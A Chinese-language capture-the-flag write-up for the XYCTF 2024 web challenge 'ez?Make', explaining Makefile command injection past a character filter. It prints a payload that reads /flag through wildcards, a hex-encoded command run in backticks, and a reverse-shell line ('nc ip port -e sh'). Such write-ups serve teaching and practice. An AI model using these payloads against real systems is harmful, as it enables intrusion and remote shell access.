# ez?Make

> 分类：Web

## 题目描述
ezMake 的 patch 版本，不能再 echo 写马，但把 `/bin` 下的命令放了出来，不再有 PATH 限制。flag 路径在 `/flag`，需要 cd 到根目录后读文件。题目过滤了 `f l a g @ $ * ? /` 等字符。

## 考察知识点
- Makefile 命令执行
- 字符过滤绕过（通配符、cd、more）
- shell 通配符正则匹配文件名

## 解法
`/bin` 命令可用（不再受 PATH 限制），flag 在 `/flag`。读文件方法 ban 了不少，但 `more` 还能用。

通过多次 `cd ..` 回到根目录，再用 shell 通配符 `[0-z]` 匹配 flag 文件名（`flag` 为 4 个字母）：

最终 payload：
```
cd ..&&cd ..&&cd ..&&cd ..&&cd ..&&more [0-z][0-z][0-z][0-z]
```

其它绕过思路（字符过滤时通用）：
```
sort `pwd | cut -c 1`[!q][k-m][!q][e-h]   # `pwd | cut -c 1` 构造 `/`
`echo 636174202F666c6167 | xxd -r -p`      # xxd 转 hex 后反引号执行
`nc ip port -e sh`                          # 反弹 shell
```

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
